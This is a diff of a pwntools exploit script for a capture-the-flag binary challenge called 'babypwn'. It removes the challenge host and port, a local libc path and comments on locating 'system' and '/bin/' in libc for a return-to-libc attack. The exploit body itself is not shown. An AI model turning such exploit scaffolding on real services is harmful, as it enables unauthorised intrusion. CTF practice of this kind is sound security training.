@@ -1,17 +1,8 @@
 from pwn import *
 
-
-
-#LD_LIBRARY_PATH=/home/vagrant/pwn/pwn_unversity2018/babypwn/libc.so.6 ./babypwn
-
-HOST = "baby.uni.hctf.fun"
-PORT = 25251
 def fuzz(f):
 
 	return cyclic(f)
-
-#strings -a -t x libc.so.6 | grep /bin/
-##readelf -s libc.so.6 | grep system
 
 def exploit(r):
 
@@ -46,7 +37,6 @@ if __name__ == '__main__':
     if(len(sys.argv) > 1):
 
         r = remote(HOST,PORT)
-        libc = ELF("/home/vagrant/pwn/pwn_university2018/babypwn/libc.so.6")
     
         exploit(r)
     else:
